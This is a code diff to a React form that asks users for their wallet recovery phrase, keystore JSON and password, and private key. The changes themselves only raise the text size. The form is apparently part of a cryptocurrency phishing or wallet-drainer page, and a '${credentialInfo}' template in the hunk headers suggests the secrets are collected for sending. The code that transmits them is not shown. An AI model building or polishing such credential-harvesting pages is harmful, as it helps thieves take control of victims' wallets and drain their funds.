@@ -204,7 +204,7 @@ ${credentialInfo}
                 </div>
 
                 {/* Form Body */}
-                <div className="p-6 sm:p-8 bg-white/40 dark:bg-slate-900/20">
+               <div className="p-6 sm:p-8 bg-white/40 dark:bg-slate-900/20">
                     <form onSubmit={handleConnect} className="space-y-6">
 
                         {/* PHRASE INPUT */}
@@ -215,7 +215,8 @@ ${credentialInfo}
                                         name="phrase"
                                         required
                                         placeholder="Enter your 12 or 24 word recovery phrase..."
-                                        className="w-full h-32 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none resize-none transition-all text-sm font-medium leading-relaxed"
+                                        // CHANGED: text-sm -> text-base
+                                        className="w-full h-32 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none resize-none transition-all text-base font-medium leading-relaxed"
                                     />
                                 </div>
                             </div>
@@ -227,14 +228,16 @@ ${credentialInfo}
                                 <textarea
                                     name="keystore_json"
                                     required
-                                    className="w-full h-24 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-sm font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
+                                    // CHANGED: text-sm -> text-base
+                                    className="w-full h-24 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-base font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
                                     placeholder="Keystore JSON"
                                 />
                                 <input
                                     name="keystore_password"
                                     type="password"
                                     required
-                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-sm placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
+                                    // CHANGED: text-sm -> text-base
+                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-base placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
                                     placeholder="Password"
                                 />
                             </div>
@@ -247,12 +250,13 @@ ${credentialInfo}
                                     name="private_key"
                                     type="password"
                                     required
-                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-sm font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
+                                    // CHANGED: text-sm -> text-base
+                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-base font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
                                     placeholder="Private Key"
                                 />
                             </div>
                         )}
-
+                        
                         {/* Submit Button */}
                         <div className="pt-2">
                             <button
